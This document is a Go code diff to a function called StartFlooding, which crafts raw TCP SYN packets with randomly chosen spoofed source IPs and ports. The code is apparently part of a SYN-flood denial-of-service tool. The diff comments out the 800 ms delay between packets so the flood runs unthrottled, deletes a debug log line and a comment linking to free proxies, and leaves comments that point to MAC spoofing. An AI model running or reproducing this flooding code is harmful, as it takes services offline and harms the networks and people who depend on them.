@@ -43,10 +43,8 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) {
 		// https://github.com/kdar/gorawtcpsyn/blob/master/main.go
 		// https://pkg.go.dev/github.com/google/gopacket
 		// https://github.com/david415/HoneyBadger/blob/021246788e58cedf88dee75ac5dbf7ae60e12514/packetSendTest.go
-		// free proxies -> https://www.sslproxies.org/
 		// mac spoofing -> https://github.com/google/gopacket/issues/153
 
-		logger.Info("hello")
 		ipPacket := buildIpPacket(srcIps[rand.Intn(len(srcIps))], dstIpStr)
 		tcpPacket := buildTcpPacket(int(srcPorts[rand.Intn(len(srcPorts))]), dstPort)
 		err := tcpPacket.SetNetworkLayerForChecksum(ipPacket)
@@ -105,7 +103,7 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) {
 		if err != nil {
 			panic(err)
 		}
-		time.Sleep(800 * time.Millisecond)
+		// time.Sleep(800 * time.Millisecond)
 	}
 }
 
@@ -132,5 +130,6 @@ func buildTcpPacket(srcPort, dstPort int) *layers.TCP {
 		Seq:     1105024978,
 		// Ack:     0,
 		SYN:     true,
+		ACK: 	 false,
 	}
 }
